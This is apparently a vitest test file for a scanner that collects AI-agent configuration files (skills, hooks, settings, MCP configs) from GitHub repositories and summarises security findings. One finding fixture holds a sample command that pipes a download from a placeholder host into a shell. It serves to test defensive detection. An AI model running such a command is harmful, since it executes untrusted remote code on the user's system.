import { describe, expect, it } from "vitest";
import {
  isPortablePath,
  parseRepoLinks,
  renderReview,
  renderSummary,
  repoDirName,
  selectAgentFiles,
  selectCandidates,
  sparsePattern,
  summarize,
  type RepoReport,
  type ReportFinding,
} from "../scripts/corpus/lib.js";

describe("corpus: parseRepoLinks", () => {
  it("extracts repositories from an awesome list, deduplicated, without site pages", () => {
    const md = [
      "- [pdf](https://github.com/acme/pdf-skill) — PDFs",
      "- [pdf again](https://github.com/Acme/PDF-skill/tree/main/skills)",
      "- [repo.git](https://github.com/acme/tool.git).",
      "- [topic](https://github.com/topics/claude) [sponsor](https://github.com/sponsors/acme)",
      "- <https://www.github.com/other/thing>",
    ].join("\n");
    expect(parseRepoLinks(md)).toEqual(["acme/pdf-skill", "acme/tool", "other/thing"]);
  });
});

describe("corpus: selectCandidates", () => {
  it("keeps priority repos first, merges sources and caps the total", () => {
    const picked = selectCandidates(
      [
        { priority: true, candidates: [{ repo: "a/seed", sources: ["seed"] }] },
        {
          priority: false,
          candidates: [
            { repo: "A/Seed", sources: ["search:x"] },
            { repo: "b/one", sources: ["search:x"] },
            { repo: "c/two", sources: ["search:y"] },
          ],
        },
      ],
      2,
    );
    expect(picked).toHaveLength(2);
    expect(picked[0]).toEqual({ repo: "a/seed", sources: ["seed", "search:x"] });
  });

  it("samples search hits in a stable order independent of input order", () => {
    const hits = ["x/1", "x/2", "x/3", "x/4", "x/5"].map((repo) => ({ repo, sources: ["search:q"] }));
    const one = selectCandidates([{ priority: false, candidates: hits }], 3);
    const two = selectCandidates([{ priority: false, candidates: [...hits].reverse() }], 3);
    expect(one).toEqual(two);
  });
});

describe("corpus: selectAgentFiles", () => {
  const tree = [
    "README.md",
    "src/index.ts",
    "CLAUDE.md",
    "docs/AGENTS.md",
    ".mcp.json",
    ".claude/settings.json",
    ".claude/commands/deploy.md",
    ".claude/skills/pdf/SKILL.md",
    ".claude/skills/pdf/scripts/run.py",
    ".claude/skills/pdf/logo.png",
    "plugins/p/.claude-plugin/plugin.json",
    "plugins/p/hooks/hooks.json",
    "plugins/p/commands/go.md",
    "plugins/p/src/lib.ts",
  ];

  it("selects what discovery scans and nothing else", () => {
    const { files } = selectAgentFiles(tree, { maxFiles: 100 });
    expect(files.sort()).toEqual(
      [
        "CLAUDE.md",
        "docs/AGENTS.md",
        ".mcp.json",
        ".claude/settings.json",
        ".claude/commands/deploy.md",
        ".claude/skills/pdf/SKILL.md",
        ".claude/skills/pdf/scripts/run.py",
        "plugins/p/.claude-plugin/plugin.json",
        "plugins/p/hooks/hooks.json",
        "plugins/p/commands/go.md",
      ].sort(),
    );
  });

  it("also selects other agents' files and the scripts in hook folders", () => {
    const sel = selectAgentFiles(
      [".cursor/rules/a.mdc", ".github/copilot-instructions.md", ".claude/hooks/guard.sh", "plugins/p/hooks/run.sh", "src/app.ts"],
      { maxFiles: 100 },
    );
    expect(sel.files.sort()).toEqual([".claude/hooks/guard.sh", ".cursor/rules/a.mdc", ".github/copilot-instructions.md"].sort());
    const plugin = selectAgentFiles(["plugins/p/.claude-plugin/plugin.json", "plugins/p/hooks/run.sh", "plugins/p/src/x.ts"], { maxFiles: 100 });
    expect(plugin.files.sort()).toEqual(["plugins/p/.claude-plugin/plugin.json", "plugins/p/hooks/run.sh"]);
  });

  it("treats a root-level SKILL.md as a skill covering the whole repo, standalone files first", () => {
    const sel = selectAgentFiles(["a.py", "b.py", "SKILL.md", ".mcp.json"], { maxFiles: 2 });
    expect(sel.files.slice(0, 2)).toEqual(["SKILL.md", ".mcp.json"]);
    expect(sel.truncated).toBe(2);
  });

  it("drops paths that cannot be checked out on Windows when asked", () => {
    const sel = selectAgentFiles(["skills/x/SKILL.md", "skills/x/a:b.md", "skills/x/con.txt"], { maxFiles: 10, portable: true });
    expect(sel.files).toEqual(["skills/x/SKILL.md"]);
    expect(sel.unportable).toBe(2);
  });
});

describe("corpus: path helpers", () => {
  it("isPortablePath", () => {
    expect(isPortablePath("a/b/c.md")).toBe(true);
    for (const bad of ["a/b?.md", "a/NUL", "a/x.", "a/ x ", "a//b", ".git/hooks/x", "a/GIT~1/config", "a/.GIT/config", "x.md::$DATA"]) {
      expect(isPortablePath(bad), bad).toBe(false);
    }
  });

  it("sparsePattern anchors and escapes glob characters", () => {
    expect(sparsePattern("a/b.md")).toBe("/a/b.md");
    expect(sparsePattern("a/[x]*!#.md")).toBe("/a/\\[x\\]\\*\\!\\#.md");
  });

  it("repoDirName", () => {
    expect(repoDirName("acme/tool")).toBe("acme__tool");
    expect(repoDirName("acme/C.E.O.")).toBe("acme__C.E.O_");
  });
});

const finding = (over: Partial<ReportFinding>): ReportFinding => ({
  ruleId: "SW004",
  severity: "high",
  confidence: "high",
  file: "SKILL.md",
  line: 3,
  message: "pipes a download into a shell",
  snippet: "curl https://example.invalid | sh",
  ...over,
});

const report = (repo: string, findings: ReportFinding[], kinds: string[] = ["skill"]): RepoReport => ({
  repo,
  sha: "0123456789abcdef0123",
  report: {
    version: 1,
    summary: { targets: kinds.length, files: kinds.length, findings: findings.length },
    targets: kinds.map((kind, i) => ({ kind, path: `t${i}`, files: [`t${i}`] })),
    findings,
    skipped: [{ path: "x.png", reason: "binary file" }],
    errors: [],
  },
});

describe("corpus: summarize", () => {
  const reports = [
    report("a/one", [finding({}), finding({ ruleId: "SW005", severity: "medium", file: "CLAUDE.md" })]),
    report("b/two", [finding({ severity: "low", confidence: "low" })], ["skill", "settings"]),
    report("c/three", []),
  ];
  const s = summarize(reports);

  it("counts repos, targets and findings", () => {
    expect(s.repos).toBe(3);
    expect(s.targets).toBe(4);
    expect(s.targetsByKind).toEqual({ skill: 3, settings: 1 });
    expect(s.findings).toBe(3);
    expect(s.bySeverity).toEqual({ info: 0, low: 1, medium: 1, high: 1 });
    expect(s.reposByWorstSeverity).toEqual({ info: 0, low: 1, medium: 0, high: 1, none: 1 });
    expect(s.skipped).toEqual({ "binary file": 3 });
  });

  it("aggregates per rule", () => {
    const sw004 = s.rules.find((r) => r.ruleId === "SW004")!;
    expect(sw004).toMatchObject({ findings: 2, repos: 2, files: 2, byConfidence: { high: 1, low: 1 } });
    expect(s.noisiestFiles[0]).toEqual({ repo: "a/one", file: "CLAUDE.md", findings: 1 });
  });

  it("renders Markdown that keeps quoted content inert", () => {
    const md = renderSummary(summarize([report("a/one", [finding({ file: "x|`y`\n.md" })])]), { generatedAt: "now", tool: "skillward 0" });
    expect(md).toContain("| SW004 | 1 | 1 | 1 | 1 | 0 | 0 | 0 |");
    expect(md).toContain("x\\|'y' .md");
    const reviewMd = renderReview(reports, "medium");
    expect(reviewMd).toContain("## a/one @ 0123456789ab");
    expect(reviewMd).not.toContain("b/two");
  });
});
